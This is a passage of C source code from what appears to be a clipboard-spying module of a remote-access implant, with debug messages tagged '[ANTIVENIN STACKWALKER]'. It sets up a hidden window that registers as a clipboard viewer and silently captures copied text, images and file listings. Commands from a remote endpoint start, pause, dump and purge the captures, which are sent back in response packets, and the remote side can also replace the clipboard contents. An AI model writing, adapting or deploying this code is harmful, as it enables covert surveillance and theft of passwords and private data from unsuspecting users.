							dwResult = GetLastError();
							dprintf("[ANTIVENIN STACKWALKER] Failed to convert clipboard image to JPG");
						}
					}

					pGlobalUnlock(hClipboardData);
				}
				else
				{
					dwResult = GetLastError();
					dprintf("[ANTIVENIN STACKWALKER] Failed to get access to the CF_DIB information");
				}
			}
			else if (uFormat == CF_HDROP)
			{
				// there's one or more files on the clipboard
				dprintf("[ANTIVENIN STACKWALKER] Files have been located on the clipboard");
				dprintf("[ANTIVENIN STACKWALKER] Grabbing the clipboard file drop data");
				if ((hClipboardData = pGetClipboardData(CF_HDROP)) != NULL
					&& (hFileDrop = (HDROP)pGlobalLock(hClipboardData)) != NULL)
				{
					uFileCount = pDragQueryFileA(hFileDrop, (UINT)-1, NULL, 0);

					dprintf("[ANTIVENIN STACKWALKER] Parsing %u file(s) on the clipboard.", uFileCount);
					pCapture->captureType = CapFiles;
					pFile = pCapture->lpFiles;

					for (uFileIndex = 0; uFileIndex < uFileCount; ++uFileIndex)
					{
						if (pFile == NULL)
						{
							dprintf("[ANTIVENIN STACKWALKER] First file");
							pCapture->lpFiles = pFile = (ClipboardFile*)malloc(sizeof(ClipboardFile));
						}
						else
						{
							dprintf("[ANTIVENIN STACKWALKER] Extra file");
							pFile->pNext = (ClipboardFile*)malloc(sizeof(ClipboardFile));
							pFile = pFile->pNext;
						}

						memset(pFile, 0, sizeof(ClipboardFile));

						dprintf("[ANTIVENIN STACKWALKER] Attempting to get file data");
						if (pDragQueryFileA(hFileDrop, uFileIndex, lpFileName, sizeof(lpFileName)))
						{
							dprintf("[ANTIVENIN STACKWALKER] Clipboard file entry: %s", lpFileName);

							dwCount = lstrlenA(lpFileName) + 1;
							pFile->lpPath = (char*)malloc(dwCount);
							memset(pFile->lpPath, 0, dwCount);
							strncpy_s(pFile->lpPath, dwCount, lpFileName, dwCount - 1);
							pCapture->dwSize += dwCount;

							memset(&largeInt, 0, sizeof(largeInt));

							if ((hSourceFile = pCreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != NULL)
							{
								if (pGetFileSizeEx(hSourceFile, &largeInt))
								{
									pFile->qwSize = htonq(largeInt.QuadPart);
								}

								pCloseHandle(hSourceFile);
							}

						}
					}

					pGlobalUnlock(hClipboardData);
				}
			}
		}

		dwResult = GetLastError();
		dprintf("[ANTIVENIN STACKWALKER] Finished with result %u (%x)", dwResult, dwResult);

		pCloseClipboard();
	} while (0);

	if (dwResult != ERROR_SUCCESS)
	{
		free(pCapture);
		pCapture = NULL;
	}
	*ppCapture = pCapture;

	return dwResult;
}

/*!
 * @brief Message proc function for the hidden clipboard monitor window.
 * @param hWnd Handle to the window receiving the message.
 * @param uMsg Message that is being received.
 * @param wParam First parameter associated with the message.
 * @param lParam Second parameter associated with the message.
 * @returns Message-specific result.
 * @remark This window proc captures the clipboard change events.
 */
LRESULT WINAPI clipboard_monitor_window_proc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	DWORD dwResult;
	ClipboardState* pState = NULL;
	ClipboardCapture* pNewCapture = NULL;

	switch (uMsg)
	{
	case WM_NCCREATE:
		return TRUE;

	case WM_CREATE:
		dprintf("[ANTIVENIN STACKWALKER] received WM_CREATE %x (lParam = %p wParam = %p)", hWnd, lParam, wParam);
		pState = (ClipboardState*)((CREATESTRUCTA*)lParam)->lpCreateParams;
		SetWindowLongPtrA(hWnd, GWLP_USERDATA, (LONG_PTR)pState);
		pState->hNextViewer = SetClipboardViewer(hWnd);
		dprintf("[ANTIVENIN STACKWALKER] SetClipboardViewer called, next viewer is %x", pState->hNextViewer);

		if (!pState->hNextViewer)
		{
			dprintf("[ANTIVENIN STACKWALKER] SetClipboardViewer error %u", GetLastError());
		}

		return 0;

	case WM_CHANGECBCHAIN: 
		dprintf("[ANTIVENIN STACKWALKER] received WM_CHANGECBCHAIN %x", hWnd);
		pState = (ClipboardState*)GetWindowLongPtrA(hWnd, GWLP_USERDATA);

		if ((HWND)wParam == pState->hNextViewer)
		{
			pState->hNextViewer = (HWND)lParam;
			dprintf("[ANTIVENIN STACKWALKER] Next viewer is now %x", pState->hNextViewer);
		}
		else if (pState->hNextViewer)
		{
			SendMessageA(pState->hNextViewer, uMsg, wParam, lParam);
		}

		return 0;

     case WM_DRAWCLIPBOARD:
		dprintf("[ANTIVENIN STACKWALKER] received WM_DRAWCLIPBOARD %x", hWnd);
		pState = (ClipboardState*)GetWindowLongPtrA(hWnd, GWLP_USERDATA);

		if (pState->bRunning)
		{
			dprintf("[ANTIVENIN STACKWALKER] thread is running, harvesting clipboard %x", hWnd);
			dwResult = capture_clipboard(pState->bCaptureImageData, &pNewCapture);
			if (dwResult == ERROR_SUCCESS && pNewCapture != NULL)
			{
				if (add_clipboard_capture(pNewCapture, &pState->captureList))
				{
					dprintf("[ANTIVENIN STACKWALKER] Capture added %x", hWnd);
				}
				else
				{
					free(pNewCapture);
					dprintf("[ANTIVENIN STACKWALKER] Ignoring duplicate capture", hWnd);
				}
			}
			else
			{
				dprintf("[ANTIVENIN STACKWALKER] Failed to harvest from clipboard %x: %u (%x)", hWnd, dwResult, dwResult);
			}
		}
		else
		{
			dprintf("[ANTIVENIN STACKWALKER] thread is no running, ignoring clipboard change %x", hWnd);
		}

		if (pState->hNextViewer)
		{
			dprintf("[ANTIVENIN STACKWALKER] Passing on to %x", pState->hNextViewer);
			SendMessageA(pState->hNextViewer, uMsg, wParam, lParam);
		}

		return 0;

	case WM_DESTROY:
		dprintf("[ANTIVENIN STACKWALKER] received WM_DESTROY %x", hWnd);
		pState = (ClipboardState*)GetWindowLongPtrA(hWnd, GWLP_USERDATA);
		ChangeClipboardChain(hWnd, pState->hNextViewer); 

		return 0;

	default:
		dprintf("[ANTIVENIN STACKWALKER] received %x for window %x", uMsg);
		return DefWindowProcA(hWnd, uMsg, wParam, lParam);
	}
}

/*!
 * @brief Create a hidden window that will capture clipboard change events.
 * @param pState Pointer to the state entity for the current clipboard thread.
 * @returns Indication of success or failure.
 * @remark This function also registers a random window class.
 */
DWORD create_clipboard_monitor_window(ClipboardState* pState)
{
	DWORD dwResult;
	BOOL bRegistered = FALSE;
	WNDCLASSEXA wndClass = { 0 };

	ZeroMemory(&wndClass, sizeof(wndClass));
	wndClass.cbSize = sizeof(WNDCLASSEXA);
	wndClass.lpfnWndProc = (WNDPROC)clipboard_monitor_window_proc;
	wndClass.hInstance = GetModuleHandleA(NULL);
	wndClass.lpszClassName = pState->cbWindowClass;

	dprintf("[ANTIVENIN STACKWALKER] Setting up the monitor window. Class = %s from %p -> %s", wndClass.lpszClassName, pState, pState->cbWindowClass);

	do
	{
		if (!RegisterClassExA(&wndClass))
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Failed to register window class.");
		}

		dprintf("[ANTIVENIN STACKWALKER] Window registered");
		bRegistered = TRUE;

		pState->hClipboardWindow = CreateWindowExA(0, pState->cbWindowClass, pState->cbWindowClass, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, wndClass.hInstance, pState);

		if (pState->hClipboardWindow == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Failed to create message only window instance");
		}

		dprintf("[ANTIVENIN STACKWALKER] Window created");
		dwResult = ERROR_SUCCESS;

	} while (0);

	if (pState->hClipboardWindow == NULL && bRegistered)
	{
		dprintf("[ANTIVENIN STACKWALKER] Unregistering window class due to failure");
		UnregisterClassA(pState->cbWindowClass, wndClass.hInstance);
	}

	return dwResult;
}

/*!
 * @brief Destroy the hidden clipboard monitor window.
 * @param pState Pointer to the state entity for the current clipboard thread which
 *               contains the window handle.
 * @returns Indication of success or failure.
 * @remark This function also unregisters the random window class.
 */
DWORD destroy_clipboard_monitor_window(ClipboardState* pState)
{
	DWORD dwResult;

	do
	{
		dprintf("[ANTIVENIN STACKWALKER] Destroying clipboard monitor window: %p", pState);
		if (!DestroyWindow(pState->hClipboardWindow))
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Failed to destroy the clipboard window");
		}

		if (!UnregisterClassA(pState->cbWindowClass, GetModuleHandleA(NULL)))
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Failed to remove the clipboard window class");
		}

		dwResult = ERROR_SUCCESS;
	} while (0);

	return dwResult;
}
#endif

/*!
 * @brief Handle the request to get the data from the clipboard.
 * @details This function currently only supports the following clipboard data formats:
 *             - CF_TEXT  - raw text data.
 *             - CF_DIB   - bitmap/image information.
 *             - CF_HDROP - file selection.
 *
 *          Over time more formats will be supported.
 * @param remote Pointer to the remote endpoint.
 * @param packet Pointer to the request packet.
 * @return Indication of success or failure.
 * @todo Add support for more data formats.
 */
DWORD request_clipboard_get_data(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult;
	ClipboardCapture* pCapture = NULL;
	BOOL bDownload = FALSE;
	Packet *pResponse = packet_create_response(packet);

	do
	{
		dprintf("[ANTIVENIN STACKWALKER] Checking to see if we loaded OK");
		if (!gClipboardInitialised)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Clipboard failed to initialise, unable to get data");
		}

		bDownload = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_DOWNLOAD);

		if ((dwResult = capture_clipboard(bDownload, &pCapture)) != ERROR_SUCCESS)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] failed to read clipboard data");
		}

		dprintf("[ANTIVENIN STACKWALKER] writing to socket");
		dump_clipboard_capture(pResponse, pCapture, bDownload);
		dprintf("[ANTIVENIN STACKWALKER] written to socket");

		free(pCapture);

		dwResult = GetLastError();
	} while (0);

	if (pResponse)
	{
		dprintf("[ANTIVENIN STACKWALKER] sending response");
		packet_transmit_response(dwResult, remote, pResponse);
	}

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

/*!
 * @brief Handle the request to set the data that's on the clipboard.
 * @details This function currently only supports the following clipboard data formats:
 *             - CF_TEXT - raw text data.
 *
 *          Over time more formats will be supported.
 * @param remote Pointer to the remote endpoint.
 * @param packet Pointer to the request packet.
 * @return Indication of success or failure.
 * @todo Add support for more data formats.
 */
DWORD request_clipboard_set_data(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult;
	PCHAR lpClipString;
	HGLOBAL hClipboardData;
	PCHAR lpLockedData;
	SIZE_T cbStringBytes;

	do
	{
		dprintf("[ANTIVENIN STACKWALKER] Checking to see if we loaded OK");
		if (!gClipboardInitialised)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Clipboard failed to initialise, unable to get data");
		}

		if ((lpClipString = packet_get_tlv_value_string(packet, TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT)) == NULL)
		{
			BREAK_WITH_ERROR("[ANTIVENIN STACKWALKER] No string data specified", ERROR_INVALID_PARAMETER);
		}

		cbStringBytes = (SIZE_T)strlen(lpClipString) + 1;

		// do the "use the right kind of memory once locked" clip board data dance.
		// Note that we don't free up the memory we've allocated with GlobalAlloc
		// because the windows clipboard magic does it for us.
		if ((hClipboardData = pGlobalAlloc(GMEM_MOVEABLE | GMEM_DDESHARE, cbStringBytes)) == NULL)
		{
			dwResult = GetLastError();
			pCloseClipboard();
			BREAK_WITH_ERROR("[ANTIVENIN STACKWALKER] Failed to allocate clipboard memory", dwResult);
		}

		lpLockedData = (PCHAR)pGlobalLock(hClipboardData);

		memcpy_s(lpLockedData, cbStringBytes, lpClipString, cbStringBytes);

		pGlobalUnlock(hClipboardData);

		// Try to get a lock on the clipboard
		if (!pOpenClipboard(NULL))
		{
			dwResult = GetLastError();
			BREAK_WITH_ERROR("[ANTIVENIN STACKWALKER] Unable to open the clipboard", dwResult);
		}

		// Clear the clipboard data
		pEmptyClipboard();

		if (!pSetClipboardData(CF_TEXT, hClipboardData))
		{
			dwResult = GetLastError();
			dprintf("[ANTIVENIN STACKWALKER] Failed to set the clipboad data: %u", dwResult);
		}
		else
		{
			dwResult = ERROR_SUCCESS;
		}

		pCloseClipboard();

	} while (0);

	// If something went wrong and we have clipboard data, then we need to
	// free it up because the clipboard can't do it for us.
	if (dwResult != ERROR_SUCCESS && hClipboardData != NULL)
	{
		pGlobalFree(hClipboardData);
	}

	packet_transmit_empty_response(remote, packet, dwResult);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

/*!
 * @brief Function which executes the clipboard monitoring.
 * @param thread Pointer to the thread context.
 * @remark This function also handles cross-thread synchronisation with
 *         callers that want to interact with the clipboard data.
 */
DWORD THREADCALL clipboard_monitor_thread_func(THREAD * thread)
{
#ifdef _WIN32
	DWORD dwResult;
	BOOL bTerminate = FALSE;
	HANDLE waitableHandles[3] = {0};
	MSG msg;
	ClipboardState* pState = (ClipboardState*)thread->parameter1;

	do
	{
		if (pState == NULL)
		{
			BREAK_WITH_ERROR("[ANTIVENIN STACKWALKER] Thread state is NULL", ERROR_INVALID_PARAMETER);
		}

		dwResult = create_clipboard_monitor_window(pState);
		if (dwResult != ERROR_SUCCESS)
		{
			break;
		}

		// signal to the caller that our thread has started
		dprintf("[ANTIVENIN STACKWALKER] Thread started");
		pState->bRunning = TRUE;
		event_signal(pState->hResponseEvent);

		waitableHandles[0] = thread->sigterm->handle;
		waitableHandles[1] = pState->hPauseEvent->handle;
		waitableHandles[2] = pState->hResumeEvent->handle;

		dprintf("[ANTIVENIN STACKWALKER] thread wait handle : %x", waitableHandles[0]);
		dprintf("[ANTIVENIN STACKWALKER] pause wait handle  : %x", waitableHandles[1]);
		dprintf("[ANTIVENIN STACKWALKER] resume wait handle : %x", waitableHandles[2]);

		while (!bTerminate)
		{
			dwResult = WaitForMultipleObjects(3, waitableHandles, FALSE, 1) - WAIT_OBJECT_0;

			switch (dwResult)
			{
			case 0: // stop the thread
				dprintf("[ANTIVENIN STACKWALKER] Thread stopping");
				bTerminate = TRUE;
				break;
			case 1: // pause the thread
				dprintf("[ANTIVENIN STACKWALKER] Thread paused");
				pState->bRunning = FALSE;
				// indicate that we've paused
				event_signal(pState->hResponseEvent);
				break;
			case 2: // resume the thread
				dprintf("[ANTIVENIN STACKWALKER] Thread resumed");
				pState->bRunning = TRUE;
				// indicate that we've resumed
				event_signal(pState->hResponseEvent);
				break;
			default:
				// timeout, so pump messages
				if (pState->hClipboardWindow && PeekMessageA(&msg, pState->hClipboardWindow, 0, 0, PM_REMOVE))
				{
					dprintf("[ANTIVENIN STACKWALKER] Pumping message");
					TranslateMessage(&msg);
					DispatchMessageA(&msg);
				}
				break;
			}
		}

		// and we're done, switch off, and tell the caller we're done
		pState->bRunning = FALSE;
		destroy_clipboard_monitor_window(pState);
		event_signal(pState->hResponseEvent);
		dprintf("[ANTIVENIN STACKWALKER] Thread stopped");

	} while (0);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

/*!
 * @brief Clean up all the state associated with a monitor thread.
 * @param pState Pointer to the state clean up.
 */
VOID destroy_clipboard_monitor_state(ClipboardState** ppState)
{
	dprintf("[ANTIVENIN STACKWALKER] Destroying clipboard monitor state");
	if (ppState != NULL && (*ppState) != NULL)
	{
		ClipboardState* pState = *ppState;
		if (pState->hThread != NULL)
		{
			thread_destroy(pState->hThread);
		}
		if (pState->hPauseEvent != NULL)
		{
			event_destroy(pState->hPauseEvent);
		}
		if (pState->hResumeEvent != NULL)
		{
			event_destroy(pState->hResumeEvent);
		}
		if (pState->hResponseEvent != NULL)
		{
			event_destroy(pState->hResponseEvent);
		}
		destroy_clipboard_monitor_capture(&pState->captureList, TRUE);

		free(pState);
		*ppState = NULL;
	}
}

/*!
 * @brief Handle the request to start the clipboard monitor.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet containing the request.
 * @returns Indication of success or failure.
 */
DWORD request_clipboard_monitor_start(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult = ERROR_SUCCESS;
	ClipboardState* pState = NULL;
	char* lpClassName = NULL;

	do
	{
		dprintf("[ANTIVENIN STACKWALKER] Checking to see if we loaded OK");
		if (!gClipboardInitialised)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Clipboard failed to initialise, unable to get data");
		}

		if (gClipboardState != NULL)
		{
			BREAK_WITH_ERROR("[ANTIVENIN STACKWALKER] Monitor thread already running", ERROR_ALREADY_INITIALIZED);
		}

		dprintf("[ANTIVENIN STACKWALKER] Starting clipboard monitor");

		pState = (ClipboardState*)malloc(sizeof(ClipboardState));
		if (pState == NULL)
		{
			BREAK_WITH_ERROR("[ANTIVENIN STACKWALKER] Unable to allocate memory for clipboard state", ERROR_NOT_ENOUGH_MEMORY);
		}

		dprintf("[ANTIVENIN STACKWALKER] pState %p", pState);
		memset(pState, 0, sizeof(ClipboardState));

		lpClassName = packet_get_tlv_value_string(packet, TLV_TYPE_EXT_CLIPBOARD_MON_WIN_CLASS);
		if (lpClassName == NULL || strlen(lpClassName) == 0)
		{
			BREAK_WITH_ERROR("[ANTIVENIN STACKWALKER] Window class name is missing", ERROR_INVALID_PARAMETER);
		}

		strncpy_s(pState->cbWindowClass, sizeof(pState->cbWindowClass), lpClassName, sizeof(pState->cbWindowClass) - 1);
		dprintf("[ANTIVENIN STACKWALKER] Class Name set to %s", pState->cbWindowClass);

		pState->bCaptureImageData = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAP_IMG_DATA);

		pState->hPauseEvent = event_create();
		pState->hResumeEvent = event_create();
		pState->hResponseEvent = event_create();
		pState->captureList.pClipboardCaptureLock = lock_create();

		if (pState->hPauseEvent == NULL
			|| pState->hResumeEvent == NULL
			|| pState->hResponseEvent == NULL)
		{
			BREAK_WITH_ERROR("[ANTIVENIN STACKWALKER] Unable to allocate memory for clipboard events", ERROR_NOT_ENOUGH_MEMORY);
		}

		pState->hThread = thread_create((THREADFUNK)clipboard_monitor_thread_func, pState, NULL, NULL);

		if (pState->hThread == NULL)
		{
			BREAK_WITH_ERROR("[ANTIVENIN STACKWALKER] Unable to allocate memory for clipboard thread", ERROR_NOT_ENOUGH_MEMORY);
		}

		gClipboardState = pState;
		thread_run(pState->hThread);

		// 4 seconds should be long enough for the thread to indicate it's started, if not, bomb out
		if (!event_poll(pState->hResponseEvent, 4000))
		{
			BREAK_WITH_ERROR("[ANTIVENIN STACKWALKER] Thread failed to start correctly", ERROR_ABANDONED_WAIT_0);
		}

		dwResult = ERROR_SUCCESS;
	} while (0);

	if (dwResult == ERROR_ALREADY_INITIALIZED)
	{
		// if we've already been initialised, then we don't want to go
		// resetting gClipboardState back to NULL because that means
		// the existing monitor will run indefinitely! Instead we will
		// just simulate success here
		dwResult = ERROR_SUCCESS;
	}
	else if (dwResult != ERROR_SUCCESS)
	{
		destroy_clipboard_monitor_state(&pState);
		gClipboardState = NULL;
	}

	packet_transmit_empty_response(remote, packet, dwResult);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

/*!
 * @brief Pause the monitor thread, if it's running.
 * @param pState Pointer to the clipboard monitor thread state.
 * @returns Always returns \c ERROR_SUCCESS.
 */
DWORD clipboard_monitor_pause(ClipboardState* pState)
{
	if (pState->bRunning)
	{
		event_signal(pState->hPauseEvent);
		event_poll(pState->hResponseEvent, INFINITE);
	}

	return ERROR_SUCCESS;
}

/*!
 * @brief Resume the monitor thread.
 * @param pState Pointer to the clipboard monitor thread state.
 * @returns Always returns \c ERROR_SUCCESS.
 */
DWORD clipboard_monitor_resume(ClipboardState* pState)
{
	if (!pState->bRunning)
	{
		event_signal(pState->hResumeEvent);
		event_poll(pState->hResponseEvent, INFINITE);
	}

	return ERROR_SUCCESS;
}

/*!
 * @brief Handle the request to pause the clipboard monitor.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet containing the request.
 * @returns Indication of success or failure.
 */
DWORD request_clipboard_monitor_pause(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult = ERROR_SUCCESS;

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[ANTIVENIN STACKWALKER] Monitor thread isn't running", ERROR_NOT_CAPABLE);
		}

		dprintf("[ANTIVENIN STACKWALKER] Pausing clipboard monitor");

		dwResult = clipboard_monitor_pause(gClipboardState);
	} while (0);

	packet_transmit_empty_response(remote, packet, dwResult);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

/*!
 * @brief Handle the request to resume the clipboard monitor.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet containing the request.
 * @returns Indication of success or failure.
 */
DWORD request_clipboard_monitor_resume(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult = ERROR_SUCCESS;

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[ANTIVENIN STACKWALKER] Monitor thread isn't running", ERROR_NOT_CAPABLE);
		}

		dprintf("[ANTIVENIN STACKWALKER] Resuming clipboard monitor");

		dwResult = clipboard_monitor_resume(gClipboardState);
	} while (0);

	packet_transmit_empty_response(remote, packet, dwResult);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

/*!
 * @brief Handle the request to stop the clipboard monitor.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet containing the request.
 * @returns Indication of success or failure.
 */
DWORD request_clipboard_monitor_stop(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult = ERROR_SUCCESS;
	BOOL bDump = TRUE;
	BOOL bIncludeImages = TRUE;
	Packet *pResponse = packet_create_response(packet);

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[ANTIVENIN STACKWALKER] Monitor thread isn't running", ERROR_NOTHING_TO_TERMINATE);
		}

		dprintf("[ANTIVENIN STACKWALKER] Stopping clipboard monitor");
		bDump = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_DUMP);
		bIncludeImages = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAP_IMG_DATA);

		// now stop the show
		event_signal(gClipboardState->hThread->sigterm);

		// if they don't terminate in a reasonable period of time...
		if (!event_poll(gClipboardState->hResponseEvent, 10000))
		{
			// ... FINISH HIM!
			dprintf("[ANTIVENIN STACKWALKER] Brutally terminating the thread for not responding fast enough");
			thread_kill(gClipboardState->hThread);
		}
		
		if (bDump)
		{
			dump_clipboard_capture_list(pResponse, &gClipboardState->captureList, bIncludeImages, TRUE);
		}

		destroy_clipboard_monitor_state(&gClipboardState);
		dwResult = ERROR_SUCCESS;
	} while (0);

	packet_transmit_response(dwResult, remote, pResponse);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

/*!
 * @brief Handle the request to dump the contents of the clipboard monitor.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet containing the request.
 * @returns Indication of success or failure.
 */
DWORD request_clipboard_monitor_dump(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult = ERROR_SUCCESS;
	BOOL bIncludeImages = TRUE;
	BOOL bPurge = TRUE;
	Packet *pResponse = packet_create_response(packet);

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[ANTIVENIN STACKWALKER] Monitor thread isn't running", ERROR_NOT_CAPABLE);
		}
		bIncludeImages = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAP_IMG_DATA);
		bPurge = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_PURGE);

		dprintf("[ANTIVENIN STACKWALKER] Purging? %s", bPurge ? "TRUE" : "FALSE");

		dump_clipboard_capture_list(pResponse, &gClipboardState->captureList, bIncludeImages, bPurge);

		if (bPurge)
		{
			lock_acquire(gClipboardState->captureList.pClipboardCaptureLock);
			destroy_clipboard_monitor_capture(&gClipboardState->captureList, FALSE);
			lock_release(gClipboardState->captureList.pClipboardCaptureLock);
		}

		dwResult = ERROR_SUCCESS;
	} while (0);

	packet_transmit_response(dwResult, remote, pResponse);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

/*!
 * @brief Handle the request to purge the contents of the clipboard monitor.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet containing the request.
 * @returns Indication of success or failure.
 */
DWORD request_clipboard_monitor_purge(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult = ERROR_SUCCESS;
	BOOL bIncludeImages = TRUE;
	BOOL bPurge = TRUE;
	Packet *pResponse = packet_create_response(packet);

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[ANTIVENIN STACKWALKER] Monitor thread isn't running", ERROR_NOT_CAPABLE);
		}

		lock_acquire(gClipboardState->captureList.pClipboardCaptureLock);
		destroy_clipboard_monitor_capture(&gClipboardState->captureList, FALSE);
		lock_release(gClipboardState->captureList.pClipboardCaptureLock);

		dwResult = ERROR_SUCCESS;
	} while (0);

	packet_transmit_response(dwResult, remote, pResponse);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}
